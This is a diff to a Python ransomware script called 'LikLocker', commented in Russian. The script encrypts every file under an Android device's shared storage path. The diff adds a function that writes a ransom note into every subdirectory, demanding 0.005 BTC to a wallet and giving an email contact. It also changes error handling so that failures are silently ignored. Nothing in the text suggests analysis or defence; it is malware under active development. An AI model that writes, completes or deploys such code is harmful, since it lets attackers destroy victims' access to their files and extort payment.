@@ -41,7 +41,7 @@ def encrypt_file(file_path, key):
         plaintext = file.read()
     
     if len(plaintext) > 50 * 1024 * 1024:  # размер файла более 50 МБ
-        return  # пропускаем файл с большим размером
+        return False  # пропускаем файл с большим размером
 
     ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))
     iv = cipher.iv
@@ -61,6 +61,24 @@ def encrypt_file(file_path, key):
     
     return True
 
+def create_decrypt_file(directory):
+    decrypt_text = "Bad news, all your important files have been encrypted by LikLocker ransomware! " \
+                   "To decrypt your files, you need to download decryptor. " \
+                   "To receive it, you need to send 0.005 BTC to the Bitcoin wallet A728E05dk04gsJ7H " \
+                   "and write about successful payment to LikLockerRransomware@gmail.com " \
+                   "and wait until they send you decryptor."
+
+    # Создаем файл в текущем каталоге
+    with open(os.path.join(directory, 'LikLocker_decrypt.txt'), 'w') as file:
+        file.write(decrypt_text)
+
+    # Рекурсивно создаем файл в подкаталогах
+    for root, dirs, _ in os.walk(directory):
+        for dir in dirs:
+            sub_dir = os.path.join(root, dir)
+            with open(os.path.join(sub_dir, 'LikLocker_decrypt.txt'), 'w') as file:
+                file.write(decrypt_text)
+
 def encrypt_directory(directory, key):
     files_to_encrypt = []
     
@@ -79,11 +97,14 @@ def encrypt_directory(directory, key):
             for future in as_completed(futures):
                 file_path = futures[future]
                 try:
-                    future.result()  # Получаем результат выполнения
-                    pbar.set_postfix(file=file_path)
-                except Exception as e:
-                    print(f"Error encrypting {file_path}: {e}")  # Логирование ошибок
+                    result = future.result()  # Получаем результат выполнения
+                    if result:  # Если файл был успешно зашифрован
+                        pbar.set_postfix(file=file_path)
+                except Exception:
+                    pass  # Игнорируем ошибки при шифровании
                 pbar.update(1)
+    
+    create_decrypt_file(directory)  # Создаем файл с инструкциями
 
 def display_warning():
     # Очистка экрана
@@ -109,7 +130,8 @@ def display_warning():
     print(border)
 
 def main():
-    directory = '/storage/emulated/0/'  # Заданный путь
+    directory = '/storage/emulated/0/'
+    # Заданный путь
     key = generate_key()  # Генерация уникального ключа для шифрования
     encrypt_directory(directory, key)
     print("Encryption completed.")
